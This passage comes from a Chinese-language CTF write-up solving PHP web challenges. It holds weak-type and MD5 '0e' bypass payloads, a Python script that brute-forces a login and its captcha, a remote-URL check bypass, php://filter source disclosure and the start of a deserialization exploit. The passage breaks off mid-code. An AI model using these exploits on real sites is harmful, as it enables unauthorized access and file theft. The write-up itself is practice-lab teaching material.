<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a>&#125;</span></code></pre></div>
<p>输入x1为不是数字的就能过</p>
<p><img src="/2017/10/09/%E4%B8%96%E5%AE%89%E6%9D%AF-WriteUp/23-03-15.jpg"></p>
<p><strong>然后是第二关:</strong></p>
<div class="sourceCode" id="cb8"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="va">$x2</span><span class="op">=</span><span class="dt">(array)</span><span class="fu">json_decode</span>(<span class="pp">@</span><span class="va">$_GET</span>[<span class="st">&#39;x2&#39;</span>])<span class="ot">;</span></span>
<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span>(<span class="fu">is_array</span>(<span class="va">$x2</span>))&#123;</span>
<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a>    <span class="fu">is_numeric</span>(<span class="pp">@</span><span class="va">$x2</span>[<span class="st">&quot;x21&quot;</span>])<span class="ot">?</span><span class="cf">die</span>(<span class="st">&quot;ha?&quot;</span>)<span class="ot">:</span><span class="kw">NULL</span><span class="ot">;</span></span>
<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span>(<span class="pp">@</span><span class="va">$x2</span>[<span class="st">&quot;x21&quot;</span>])&#123;</span>
<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a>        (<span class="va">$x2</span>[<span class="st">&quot;x21&quot;</span>]<span class="op">&gt;</span><span class="dv">2017</span>)<span class="ot">?</span><span class="va">$b</span><span class="op">=</span><span class="dv">1</span><span class="ot">:</span><span class="kw">NULL</span><span class="ot">;</span></span>
<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a>    &#125;</span>
<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span>(<span class="fu">is_array</span>(<span class="pp">@</span><span class="va">$x2</span>[<span class="st">&quot;x22&quot;</span>]))&#123;</span>
<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span>(<span class="fu">count</span>(<span class="va">$x2</span>[<span class="st">&quot;x22&quot;</span>])<span class="op">!==</span><span class="dv">2</span> <span class="op">OR</span> <span class="op">!</span><span class="fu">is_array</span>(<span class="va">$x2</span>[<span class="st">&quot;x22&quot;</span>][<span class="dv">0</span>])) <span class="cf">die</span>(<span class="st">&quot;ha?&quot;</span>)<span class="ot">;</span></span>
<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a>        <span class="va">$p</span> <span class="op">=</span> <span class="fu">array_search</span>(<span class="st">&quot;XIPU&quot;</span><span class="ot">,</span> <span class="va">$x2</span>[<span class="st">&quot;x22&quot;</span>])<span class="ot">;</span></span>
<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a>        <span class="va">$p</span><span class="op">===</span><span class="kw">false</span><span class="ot">?</span><span class="cf">die</span>(<span class="st">&quot;ha?&quot;</span>)<span class="ot">:</span><span class="kw">NULL</span><span class="ot">;</span></span>
<span id="cb8-11"><a href="#cb8-11" aria-hidden="true" tabindex="-1"></a>        <span class="cf">foreach</span>(<span class="va">$x2</span>[<span class="st">&quot;x22&quot;</span>] <span class="kw">as</span> <span class="va">$key</span>=&gt;<span class="va">$val</span>)&#123;</span>
<span id="cb8-12"><a href="#cb8-12" aria-hidden="true" tabindex="-1"></a>            <span class="va">$val</span><span class="op">===</span><span class="st">&quot;XIPU&quot;</span><span class="ot">?</span><span class="cf">die</span>(<span class="st">&quot;ha?&quot;</span>)<span class="ot">:</span><span class="kw">NULL</span><span class="ot">;</span></span>
<span id="cb8-13"><a href="#cb8-13" aria-hidden="true" tabindex="-1"></a>        &#125;</span>
<span id="cb8-14"><a href="#cb8-14" aria-hidden="true" tabindex="-1"></a>        <span class="va">$c</span><span class="op">=</span><span class="dv">1</span><span class="ot">;</span></span>
<span id="cb8-15"><a href="#cb8-15" aria-hidden="true" tabindex="-1"></a>&#125;</span>
<span id="cb8-16"><a href="#cb8-16" aria-hidden="true" tabindex="-1"></a>&#125;</span></code></pre></div>
<p><code>$x2</code>是个要被解释成数组的变量</p>
<div class="sourceCode" id="cb9"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a> <span class="fu">is_numeric</span>(<span class="pp">@</span><span class="va">$x2</span>[<span class="st">&quot;x21&quot;</span>])<span class="ot">?</span><span class="cf">die</span>(<span class="st">&quot;ha?&quot;</span>)<span class="ot">:</span><span class="kw">NULL</span><span class="ot">;</span></span>
<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span>(<span class="pp">@</span><span class="va">$x2</span>[<span class="st">&quot;x21&quot;</span>])&#123;</span>
<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a>        (<span class="va">$x2</span>[<span class="st">&quot;x21&quot;</span>]<span class="op">&gt;</span><span class="dv">2017</span>)<span class="ot">?</span><span class="va">$b</span><span class="op">=</span><span class="dv">1</span><span class="ot">:</span><span class="kw">NULL</span><span class="ot">;</span></span>
<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a>    &#125;</span></code></pre></div>
<p>然后<code>$x2[x21]</code>不能是数字且要大于2017
那么php的弱类型比较就派上用场了，直接用让<code>$x2[x21]=9999是是是</code>
然后php会在比较的时候将其转化为数字<code>9999</code></p>
<div class="sourceCode" id="cb10"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a> <span class="cf">if</span>(<span class="fu">is_array</span>(<span class="pp">@</span><span class="va">$x2</span>[<span class="st">&quot;x22&quot;</span>]))&#123;</span>
<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span>(<span class="fu">count</span>(<span class="va">$x2</span>[<span class="st">&quot;x22&quot;</span>])<span class="op">!==</span><span class="dv">2</span> <span class="op">OR</span> <span class="op">!</span><span class="fu">is_array</span>(<span class="va">$x2</span>[<span class="st">&quot;x22&quot;</span>][<span class="dv">0</span>])) <span class="cf">die</span>(<span class="st">&quot;ha?&quot;</span>)<span class="ot">;</span></span>
<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a>        <span class="va">$p</span> <span class="op">=</span> <span class="fu">array_search</span>(<span class="st">&quot;XIPU&quot;</span><span class="ot">,</span> <span class="va">$x2</span>[<span class="st">&quot;x22&quot;</span>])<span class="ot">;</span></span>
<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a>        <span class="va">$p</span><span class="op">===</span><span class="kw">false</span><span class="ot">?</span><span class="cf">die</span>(<span class="st">&quot;ha?&quot;</span>)<span class="ot">:</span><span class="kw">NULL</span><span class="ot">;</span></span>
<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a>        <span class="cf">foreach</span>(<span class="va">$x2</span>[<span class="st">&quot;x22&quot;</span>] <span class="kw">as</span> <span class="va">$key</span>=&gt;<span class="va">$val</span>)&#123;</span>
<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a>            <span class="va">$val</span><span class="op">===</span><span class="st">&quot;XIPU&quot;</span><span class="ot">?</span><span class="cf">die</span>(<span class="st">&quot;ha?&quot;</span>)<span class="ot">:</span><span class="kw">NULL</span><span class="ot">;</span></span>
<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a>        &#125;</span>
<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a>        <span class="va">$c</span><span class="op">=</span><span class="dv">1</span><span class="ot">;</span></span>
<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a>&#125;</span></code></pre></div>
<p>接下来<code>$x2[x22]</code>必须是个数组，且包含两个元素且第一个是数组
然后<code>array_search("XIPU", $x2["x22"])</code>和<code>for</code>循环遍历要求<code>$x2[x22]</code>数组要有'XIPU'而且for循环又要求不能有'XIPU'
我们可以让<code>$x2[x22]</code>的第二个元素为0，跟<code>$x2[x21]</code>同理，也是弱类型比较，就会让<code>array_search("XIPU", $x2["x22"])</code>为真且满足for循环
故<code>$x2[x22]</code>=[[6],0]</p>
<p><strong>第三关</strong></p>
<div class="sourceCode" id="cb11"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="va">$x3</span> <span class="op">=</span> <span class="va">$_GET</span>[<span class="st">&#39;x3&#39;</span>]<span class="ot">;</span></span>
<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> (<span class="va">$x3</span> <span class="op">!=</span> <span class="st">&#39;15562&#39;</span>) &#123;</span>
<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> (<span class="fu">strstr</span>(<span class="va">$x3</span><span class="ot">,</span> <span class="st">&#39;XIPU&#39;</span>)) &#123;</span>
<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> (<span class="fu">substr</span>(<span class="fu">md5</span>(<span class="va">$x3</span>)<span class="ot">,</span><span class="dv">8</span><span class="ot">,</span><span class="dv">16</span>) <span class="op">==</span> <span class="fu">substr</span>(<span class="fu">md5</span>(<span class="st">&#39;15562&#39;</span>)<span class="ot">,</span><span class="dv">8</span><span class="ot">,</span><span class="dv">16</span>)) &#123;</span>
<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a>            <span class="va">$d</span><span class="op">=</span><span class="dv">1</span><span class="ot">;</span></span>
<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a>        &#125;</span>
<span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a>    &#125;</span>
<span id="cb11-8"><a href="#cb11-8" aria-hidden="true" tabindex="-1"></a>&#125;</span></code></pre></div>
<p>要求<code>$x3</code>不能是<code>"15562"</code>且包含"XIPU"字符且<code>substr(md5($x3),8,16) == substr(md5('15562'),8,16</code></p>
<p>直接MD5碰撞就好</p>
<div class="sourceCode" id="cb12"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> hashlib</span>
<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a>flag <span class="op">=</span><span class="dv">1</span></span>
<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">xrange</span>(<span class="dv">10</span>,<span class="dv">99999</span>):</span>
<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a>    md5_1 <span class="op">=</span> hashlib.md5(<span class="st">&quot;XIPU&quot;</span><span class="op">+</span><span class="bu">str</span>(i).zfill(<span class="dv">6</span>))</span>
<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a>    md5_2 <span class="op">=</span> md5_1.hexdigest()</span>
<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> md5_2[<span class="dv">8</span>:<span class="dv">10</span>] <span class="op">==</span> <span class="st">&quot;0e&quot;</span> :</span>
<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> t <span class="kw">in</span> md5_2[<span class="dv">10</span>:<span class="dv">24</span>]:</span>
<span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> t.isalpha():</span>
<span id="cb12-9"><a href="#cb12-9" aria-hidden="true" tabindex="-1"></a>                flag<span class="op">=</span><span class="dv">0</span></span>
<span id="cb12-10"><a href="#cb12-10" aria-hidden="true" tabindex="-1"></a>                <span class="cf">break</span></span>
<span id="cb12-11"><a href="#cb12-11" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> flag:</span>
<span id="cb12-12"><a href="#cb12-12" aria-hidden="true" tabindex="-1"></a>            <span class="bu">print</span> md5_2</span>
<span id="cb12-13"><a href="#cb12-13" aria-hidden="true" tabindex="-1"></a>            <span class="bu">print</span> <span class="st">&quot;XIPU&quot;</span><span class="op">+</span><span class="bu">str</span>(i).zfill(<span class="dv">6</span>)</span>
<span id="cb12-14"><a href="#cb12-14" aria-hidden="true" tabindex="-1"></a>            <span class="cf">break</span></span>
<span id="cb12-15"><a href="#cb12-15" aria-hidden="true" tabindex="-1"></a>    flag<span class="op">=</span><span class="dv">1</span></span></code></pre></div>
<p>输出结果为</p>
<pre><code>2d3f55900e724039009658983fe76971
XIPU074428</code></pre>
<p>为什么这么构造呢？
因为PHP的特性，使用<code>==</code>这个比较的时候会出现各种类型转换
我们观察到字符串<code>15562</code>MD5值的8-24位为<code>0e46379442318098 当我们以这样的形式比较 ```php &lt;?php if ("0e12"=="0e72356723") echo "E"; else echo "NE";?&gt; ``` 输出是</code>E<code>因为当字符串为</code>xexxxxx<code>，其中x为数字时，php会将字符串转换成科学计数法，即</code>0e12<code>转化为</code>0x10^12<code>结果还是0，右边的</code>0e72356723<code>同理。所以会相等 所以我们只需要构造一个MD5的8-24位形式为</code>0e[0-9]{16}<code>且包含字符串</code>XIPU<code>的字符串就好了 脚本跑出的字符串</code>XIPU074428<code>的MD5值是</code>2d3f55900e724039009658983fe76971<code>，其8-24位是</code>0e72403900965898`，正好符合条件
所以最终的payload为</p>
<pre class="url"><code>http://ctf1.shiyanbar.com/shian-leixing/
?x1=是是是
&amp;x2=&#123;&quot;x21&quot;:&quot;2018是是是&quot;,&quot;x22&quot;:[[1],0],&quot;c&quot;:3,&quot;d&quot;:4,&quot;e&quot;:5&#125;
&amp;x3=XIPU074428</code></pre>
<p><code>CTF&#123;Php_1s_bstl4_1a&#125;</code></p>
<h4 id="登录">登录</h4>
<p>进去是个登录页面，有验证码 看源码，发现最底下</p>
<p><img src="/2017/10/09/%E4%B8%96%E5%AE%89%E6%9D%AF-WriteUp/21-21-24.jpg"></p>
<p>思路也比较简单，爆破就是了 Python脚本如下</p>
<div class="sourceCode" id="cb15"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> requests,re</span>
<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a>url <span class="op">=</span>  <span class="st">&quot;http://ctf1.shiyanbar.com/shian-s/&quot;</span></span>
<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a>url1 <span class="op">=</span> <span class="st">&quot;http://ctf1.shiyanbar.com/shian-s/index.php?username=admin&amp;password=</span><span class="sc">&#123;&#125;</span><span class="st">&amp;randcode=</span><span class="sc">&#123;&#125;</span><span class="st">&quot;</span></span>
<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a>cookie <span class="op">=</span> &#123;<span class="st">&quot;PHPSESSID&quot;</span>:<span class="st">&quot;is53k685uppq82vfb30lfdsfg7&quot;</span>&#125;</span>
<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span>  i <span class="kw">in</span> <span class="bu">xrange</span>(<span class="dv">99999</span>):</span>
<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a>    Vcode <span class="op">=</span> re.findall(<span class="st">&quot;type=</span><span class="ch">\&quot;</span><span class="st">text</span><span class="ch">\&quot;</span><span class="st">&gt;&lt;br&gt;&lt;br&gt;(.*?)&lt;br&gt;&lt;br&gt;&quot;</span>,requests.get(url,cookies<span class="op">=</span>cookie).text)[<span class="dv">0</span>]</span>
<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span> <span class="st">&quot;Now processing password: &quot;</span>,<span class="bu">str</span>(i).zfill(<span class="dv">5</span>)</span>
<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a>    result <span class="op">=</span> requests.get(url1.<span class="bu">format</span>(<span class="bu">str</span>(i).zfill(<span class="dv">5</span>),Vcode),cookies<span class="op">=</span>cookie)</span>
<span id="cb15-10"><a href="#cb15-10" aria-hidden="true" tabindex="-1"></a>    result.encoding <span class="op">=</span> <span class="st">&quot;utf-8&quot;</span></span>
<span id="cb15-11"><a href="#cb15-11" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="bu">len</span>(result.text)<span class="op">!=</span><span class="dv">146</span>:</span>
<span id="cb15-12"><a href="#cb15-12" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span> result.text</span>
<span id="cb15-13"><a href="#cb15-13" aria-hidden="true" tabindex="-1"></a>        <span class="cf">break</span></span></code></pre></div>
<p>唯一的坑点就是要在cookie加上PHPSESSID 最后爆破到密码就是00325</p>
<p><img src="/2017/10/09/%E4%B8%96%E5%AE%89%E6%9D%AF-WriteUp/21-57-14.jpg">
<code>flag&#123;U1tkOdgutaVWucdy2AbDWXPGkDx9bS2a&#125;</code> #### admin
进去就提示<code>you are not admin !</code>
按照这个比赛的套路，直接看源码</p>
<div class="sourceCode" id="cb16"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a>you are not admin <span class="op">!</span> </span>
<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a><span class="va">$user</span> <span class="op">=</span> <span class="va">$_GET</span>[<span class="st">&quot;user&quot;</span>]<span class="ot">;</span></span>
<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a><span class="va">$file</span> <span class="op">=</span> <span class="va">$_GET</span>[<span class="st">&quot;file&quot;</span>]<span class="ot">;</span></span>
<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a><span class="va">$pass</span> <span class="op">=</span> <span class="va">$_GET</span>[<span class="st">&quot;pass&quot;</span>]<span class="ot">;</span></span>
<span id="cb16-6"><a href="#cb16-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-7"><a href="#cb16-7" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span>(<span class="kw">isset</span>(<span class="va">$user</span>)<span class="op">&amp;&amp;</span>(<span class="fu">file_get_contents</span>(<span class="va">$user</span><span class="ot">,</span><span class="st">&#39;r&#39;</span>)<span class="op">===</span><span class="st">&quot;the user is admin&quot;</span>))&#123;</span>
<span id="cb16-8"><a href="#cb16-8" aria-hidden="true" tabindex="-1"></a>    <span class="kw">echo</span> <span class="st">&quot;hello admin!&lt;br&gt;&quot;</span><span class="ot">;</span></span>
<span id="cb16-9"><a href="#cb16-9" aria-hidden="true" tabindex="-1"></a>    <span class="kw">include</span>(<span class="va">$file</span>)<span class="ot">;</span> <span class="co">//class.php</span></span>
<span id="cb16-10"><a href="#cb16-10" aria-hidden="true" tabindex="-1"></a>&#125;<span class="cf">else</span>&#123;</span>
<span id="cb16-11"><a href="#cb16-11" aria-hidden="true" tabindex="-1"></a>    <span class="kw">echo</span> <span class="st">&quot;you are not admin ! &quot;</span><span class="ot">;</span></span>
<span id="cb16-12"><a href="#cb16-12" aria-hidden="true" tabindex="-1"></a>&#125;</span></code></pre></div>
<p>file_get_content是可以获取外部的资源的，当然，php.ini允许的时候才可以
故直接在我的vps上直接放了个t.txt，里面就是<code>the user is admin</code>
然后就绕过了第一个判断</p>
<pre class="url"><code>http://ctf1.shiyanbar.com/shian-du/?user=https://wzsite.cn/static/t.txt</code></pre>
<p><img src="/2017/10/09/%E4%B8%96%E5%AE%89%E6%9D%AF-WriteUp/22-04-06.jpg"></p>
<p>当然你也可以这样 用php伪协议来绕过</p>
<p><img src="/2017/10/09/%E4%B8%96%E5%AE%89%E6%9D%AF-WriteUp/22-07-03.jpg"></p>
<p>当时我用的就是方法一</p>
<p>然后include了一个<code>$file</code>，我们可以用
<code>php://filter</code>伪协议来<code>include</code>class.php进来
(为什么要看class.php? 因为源码提示啊= =) 然后得到</p>
<pre><code>hello admin!
PD9waHANCg0KY2xhc3MgUmVhZHsvL2YxYTkucGhwDQogICAgcHVibGljICRmaWxlOw0KICAgIHB1YmxpYyBmdW5jdGlvbiBfX3RvU3RyaW5nKCl7DQogICAgICAgIGlmKGlzc2V0KCR0aGlzLT5maWxlKSl7DQogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgICAgDQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICJfX3RvU3RyaW5nIHdhcyBjYWxsZWQhIjsNCiAgICB9DQp9DQo/</code></pre>
<p>base64解码得到class.php的源码</p>
<div class="sourceCode" id="cb19"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span></span>
<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a><span class="kw">class</span> <span class="cn">R</span>ead&#123;<span class="co">//f1a9.php</span></span>
<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="va">$file</span><span class="ot">;</span></span>
<span id="cb19-5"><a href="#cb19-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="kw">function</span> <span class="bu">__toString</span>()&#123;</span>
<span id="cb19-6"><a href="#cb19-6" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span>(<span class="kw">isset</span>(<span class="va">$this</span>-&gt;<span class="fu">file</span>))&#123;</span>
<span id="cb19-7"><a href="#cb19-7" aria-hidden="true" tabindex="-1"></a>            <span class="kw">echo</span> <span class="fu">file_get_contents</span>(<span class="va">$this</span>-&gt;<span class="fu">file</span>)<span class="ot">;</span>    </span>
<span id="cb19-8"><a href="#cb19-8" aria-hidden="true" tabindex="-1"></a>        &#125;</span>
<span id="cb19-9"><a href="#cb19-9" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="st">&quot;__toString was called!&quot;</span><span class="ot">;</span></span>
<span id="cb19-10"><a href="#cb19-10" aria-hidden="true" tabindex="-1"></a>    &#125;</span>
<span id="cb19-11"><a href="#cb19-11" aria-hidden="true" tabindex="-1"></a>&#125;</span>
<span id="cb19-12"><a href="#cb19-12" aria-hidden="true" tabindex="-1"></a><span class="kw">?&gt;</span></span></code></pre></div>
<p>看不出引用干嘛，可能是<code>index.php</code>的源码不全
再次获取index.php的源码</p>
<div class="sourceCode" id="cb20"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span></span>
<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a><span class="va">$user</span> <span class="op">=</span> <span class="va">$_GET</span>[<span class="st">&quot;user&quot;</span>]<span class="ot">;</span></span>
<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a><span class="va">$file</span> <span class="op">=</span> <span class="va">$_GET</span>[<span class="st">&quot;file&quot;</span>]<span class="ot">;</span></span>
<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a><span class="va">$pass</span> <span class="op">=</span> <span class="va">$_GET</span>[<span class="st">&quot;pass&quot;</span>]<span class="ot">;</span></span>
<span id="cb20-5"><a href="#cb20-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb20-6"><a href="#cb20-6" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span>(<span class="kw">isset</span>(<span class="va">$user</span>)<span class="op">&amp;&amp;</span>(<span class="fu">file_get_contents</span>(<span class="va">$user</span><span class="ot">,</span><span class="st">&#39;r&#39;</span>)<span class="op">===</span><span class="st">&quot;the user is admin&quot;</span>))&#123;</span>
<span id="cb20-7"><a href="#cb20-7" aria-hidden="true" tabindex="-1"></a>    <span class="kw">echo</span> <span class="st">&quot;hello admin!&lt;br&gt;&quot;</span><span class="ot">;</span></span>
<span id="cb20-8"><a href="#cb20-8" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span>(<span class="fu">preg_match</span>(<span class="st">&quot;/f1a9/&quot;</span><span class="ot">,</span><span class="va">$file</span>))&#123;</span>
<span id="cb20-9"><a href="#cb20-9" aria-hidden="true" tabindex="-1"></a>        <span class="cf">exit</span>()<span class="ot">;</span></span>
<span id="cb20-10"><a href="#cb20-10" aria-hidden="true" tabindex="-1"></a>    &#125;<span class="cf">else</span>&#123;</span>
<span id="cb20-11"><a href="#cb20-11" aria-hidden="true" tabindex="-1"></a>        <span class="kw">include</span>(<span class="va">$file</span>)<span class="ot">;</span> <span class="co">//class.php</span></span>
<span id="cb20-12"><a href="#cb20-12" aria-hidden="true" tabindex="-1"></a>        <span class="va">$pass</span> <span class="op">=</span> <span class="fu">unserialize</span>(<span class="va">$pass</span>)<span class="ot">;</span></span>
<span id="cb20-13"><a href="#cb20-13" aria-hidden="true" tabindex="-1"></a>        <span class="kw">echo</span> <span class="va">$pass</span><span class="ot">;</span></span>
<span id="cb20-14"><a href="#cb20-14" aria-hidden="true" tabindex="-1"></a>    &#125;</span>
<span id="cb20-15"><a href="#cb20-15" aria-hidden="true" tabindex="-1"></a>&#125;<span class="cf">else</span>&#123;</span>
<span id="cb20-16"><a href="#cb20-16" aria-hidden="true" tabindex="-1"></a>    <span class="kw">echo</span> <span class="st">&quot;you are not admin ! &quot;</span><span class="ot">;</span></span>
<span id="cb20-17"><a href="#cb20-17" aria-hidden="true" tabindex="-1"></a>&#125;</span>
<span id="cb20-18"><a href="#cb20-18" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb20-19"><a href="#cb20-19" aria-hidden="true" tabindex="-1"></a><span class="kw">?&gt;</span></span>
<span id="cb20-20"><a href="#cb20-20" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb20-21"><a href="#cb20-21" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;!--</span></span>
<span id="cb20-22"><a href="#cb20-22" aria-hidden="true" tabindex="-1"></a><span class="va">$user</span> <span class="op">=</span> <span class="va">$_GET</span>[<span class="st">&quot;user&quot;</span>]<span class="ot">;</span></span>
<span id="cb20-23"><a href="#cb20-23" aria-hidden="true" tabindex="-1"></a><span class="va">$file</span> <span class="op">=</span> <span class="va">$_GET</span>[<span class="st">&quot;file&quot;</span>]<span class="ot">;</span></span>
<span id="cb20-24"><a href="#cb20-24" aria-hidden="true" tabindex="-1"></a><span class="va">$pass</span> <span class="op">=</span> <span class="va">$_GET</span>[<span class="st">&quot;pass&quot;</span>]<span class="ot">;</span></span>
<span id="cb20-25"><a href="#cb20-25" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb20-26"><a href="#cb20-26" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span>(<span class="kw">isset</span>(<span class="va">$user</span>)<span class="op">&amp;&amp;</span>(<span class="fu">file_get_contents</span>(<span class="va">$user</span><span class="ot">,</span><span class="st">&#39;r&#39;</span>)<span class="op">===</span><span class="st">&quot;the user is admin&quot;</span>))&#123;</span>
<span id="cb20-27"><a href="#cb20-27" aria-hidden="true" tabindex="-1"></a>    <span class="kw">echo</span> <span class="st">&quot;hello admin!&lt;br&gt;&quot;</span><span class="ot">;</span></span>
<span id="cb20-28"><a href="#cb20-28" aria-hidden="true" tabindex="-1"></a>    <span class="kw">include</span>(<span class="va">$file</span>)<span class="ot">;</span> <span class="co">//class.php</span></span>
<span id="cb20-29"><a href="#cb20-29" aria-hidden="true" tabindex="-1"></a>&#125;<span class="cf">else</span>&#123;</span>
<span id="cb20-30"><a href="#cb20-30" aria-hidden="true" tabindex="-1"></a>    <span class="kw">echo</span> <span class="st">&quot;you are not admin ! &quot;</span><span class="ot">;</span></span>
<span id="cb20-31"><a href="#cb20-31" aria-hidden="true" tabindex="-1"></a>&#125;</span>
<span id="cb20-32"><a href="#cb20-32" aria-hidden="true" tabindex="-1"></a> <span class="op">--</span>！<span class="op">&gt;</span></span></code></pre></div>
<p>果然留有后手 意思是叫咱们按照规则让echo
$pass运行然后调用Read类的__ToString()魔术方法
由<code>$pass = unserialize($pass); echo $pass;</code>
然后我们需要现将<code>$pass</code>序列化 故本地写个php（当然=
=也许大佬们都是直接拼出来的）</p>
<div class="sourceCode" id="cb21"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span></span>
<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a><span class="kw">class</span> <span class="cn">R</span>ead&#123;<span class="co">//f1a9.php</span></span>
<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="va">$file</span><span class="ot">;</span></span>
<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="kw">function</span> <span class="bu">__toString</span>()&#123;</span>
<span id="cb21-5"><a href="#cb21-5" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span>(<span class="kw">isset</span>(<span class="va">$this</span>-&gt;<span class="fu">file</span>))&#123;</span>
